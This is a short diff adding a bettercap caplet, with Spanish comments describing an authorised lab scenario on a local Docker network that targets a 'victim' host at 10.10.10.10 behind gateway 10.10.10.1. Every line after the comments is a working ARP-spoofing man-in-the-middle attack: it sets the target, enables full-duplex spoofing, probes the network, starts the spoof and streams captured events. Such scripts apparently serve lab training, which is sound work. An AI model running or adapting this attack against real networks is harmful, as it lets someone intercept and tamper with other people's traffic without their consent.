@@ -1,0 +1,8 @@
+# Escenario autorizado: red Docker local mitm_lan.
+# Objetivo: victima 10.10.10.10. Router/gateway de laboratorio: 10.10.10.1.
+set arp.spoof.targets 10.10.10.10
+set arp.spoof.fullduplex true
+set net.sniff.verbose false
+net.probe on
+arp.spoof on
+events.stream on
